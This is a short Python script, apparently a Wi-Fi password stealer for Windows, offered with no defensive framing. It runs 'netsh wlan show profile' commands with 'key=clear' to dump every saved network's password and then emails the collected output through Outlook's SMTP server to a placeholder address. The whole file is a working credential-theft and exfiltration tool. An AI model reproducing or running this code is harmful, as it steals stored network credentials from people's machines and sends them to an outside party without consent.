import subprocess, os

command="pip install secure-smtplib"
result=subprocess.check_output(command,shell=True)

import smtplib

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp-mail.outlook.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,"your email",message)
    server.quit()
    
command="netsh wlan show profile"
networks=subprocess.check_output(command,shell=True)
networks=networks.split()
a,b=[],[]
for i in range(len(networks)):
	networks[i]=str(networks[i])
	networks[i]=networks[i][2:-1]
	if networks[i]=='All':
		a.append(i)
	elif networks[i]==':':
		b.append(i)
a=a[1:]
d=[]
for i in range(len(a)):
	c=""
	for k in range(b[i]+1,a[i]):
		if k+1<a[i]:
			c+=networks[k]+" "
		else:
			c+=networks[k]
	d.append(c)

result=b''
for i in d:
	if "'" in i:
		continue
	command='netsh wlan show profile "'+str(i)+'" key=clear'
	passwords=subprocess.check_output(command,shell=True)
	result=result+passwords

print(result)
send_mail("your email","your password",result)